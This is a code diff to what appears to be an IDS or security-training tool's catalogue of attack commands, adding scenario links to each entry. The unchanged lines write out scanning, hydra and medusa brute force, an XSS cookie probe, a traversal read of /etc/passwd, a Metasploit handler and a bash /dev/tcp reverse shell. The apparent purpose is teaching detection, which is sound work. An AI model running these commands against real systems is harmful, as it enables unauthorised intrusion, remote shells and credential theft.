@@ -28,6 +28,7 @@ export const ATTACK_COMMANDS: AttackCommand[] = [
     cmd: 'nmap -O -sV -sC {target}',
     description: 'Identifies the operating system, open service versions, and runs default NSE scripts. Generates more traffic than a plain scan and is easily detected by IDS.',
     category: 'scanning',
+    linkedScenario: 'nmap-os-scan',
   },
   {
     id: 'ping-sweep',
@@ -45,6 +46,7 @@ export const ATTACK_COMMANDS: AttackCommand[] = [
     cmd: 'nmap -sU --top-ports 200 {target}',
     description: 'Probes the top 200 UDP ports. Slower than TCP scans because closed UDP ports send back ICMP unreachable messages and open ports often give no response.',
     category: 'scanning',
+    linkedScenario: 'udp-port-scan',
   },
   {
     id: 'nikto',
@@ -53,6 +55,7 @@ export const ATTACK_COMMANDS: AttackCommand[] = [
     cmd: 'nikto -h http://{target} -o nikto_report.html',
     description: 'Automated web server scanner that checks for thousands of potentially dangerous files, outdated server software, and misconfigurations. Very noisy — easy to detect.',
     category: 'scanning',
+    linkedScenario: 'nikto-scan',
   },
   {
     id: 'gobuster',
@@ -61,6 +64,7 @@ export const ATTACK_COMMANDS: AttackCommand[] = [
     cmd: 'gobuster dir -u http://{target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
     description: 'Brute-forces hidden directories and files on a web server. Generates hundreds to thousands of HTTP requests. Common wordlists include SecLists and DirBuster lists.',
     category: 'scanning',
+    linkedScenario: 'gobuster-scan',
   },
 
   // ── Brute Force ───────────────────────────────────────────────────────────
@@ -89,6 +93,7 @@ export const ATTACK_COMMANDS: AttackCommand[] = [
     cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{target}',
     description: 'Password guessing against FTP. FTP sends credentials in cleartext so even a single successful login is a serious risk. Very easy for IDS to detect due to repeated PASS commands.',
     category: 'brute-force',
+    linkedScenario: 'ftp-brute-force',
   },
   {
     id: 'medusa-rdp',
@@ -97,6 +102,7 @@ export const ATTACK_COMMANDS: AttackCommand[] = [
     cmd: 'medusa -h {target} -u administrator -P /usr/share/wordlists/rockyou.txt -M rdp',
     description: 'Credential stuffing against Windows Remote Desktop Protocol (port 3389). RDP brute force is extremely common in the wild — NLA (Network Level Authentication) adds a layer of defense.',
     category: 'brute-force',
+    linkedScenario: 'rdp-brute-force',
   },
 
   // ── Web Attacks ───────────────────────────────────────────────────────────
@@ -125,6 +131,7 @@ export const ATTACK_COMMANDS: AttackCommand[] = [
     cmd: "curl -s \"http://{target}/search?q=<script>alert(document.cookie)</script>\"",
     description: 'Basic reflected XSS probe. If the response echoes the payload unescaped, the application is vulnerable. Modern browsers block some XSS via built-in protections, but stored XSS bypasses them.',
     category: 'web',
+    linkedScenario: 'xss-probe',
   },
   {
     id: 'lfi',
@@ -133,6 +140,7 @@ export const ATTACK_COMMANDS: AttackCommand[] = [
     cmd: 'curl -s "http://{target}/page?file=../../../../etc/passwd"',
     description: 'Path traversal to read local files outside the web root. A successful response returns /etc/passwd contents. Can escalate to Remote Code Execution via log poisoning or /proc/self/fd.',
     category: 'web',
+    linkedScenario: 'lfi-attack',
   },
 
   // ── Exploitation ──────────────────────────────────────────────────────────
@@ -143,6 +151,7 @@ export const ATTACK_COMMANDS: AttackCommand[] = [
     cmd: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST {target}; set LPORT 4444; run"',
     description: 'Sets up a Metasploit listener for incoming reverse shell connections. After a victim executes a payload, it connects back to this handler and gives the attacker an interactive session.',
     category: 'exploitation',
+    linkedScenario: 'metasploit-handler',
   },
   {
     id: 'netcat-shell',
@@ -151,6 +160,7 @@ export const ATTACK_COMMANDS: AttackCommand[] = [
     cmd: 'nc -lvnp 4444   # on attacker\n# On victim: bash -i >& /dev/tcp/{target}/4444 0>&1',
     description: 'Classic reverse shell using netcat. The victim machine connects back to the attacker\'s nc listener. Easily detected by IDS via the bash TCP redirect pattern or nc listener on non-standard ports.',
     category: 'exploitation',
+    linkedScenario: 'reverse-shell',
   },
 
   // ── Exfiltration ──────────────────────────────────────────────────────────
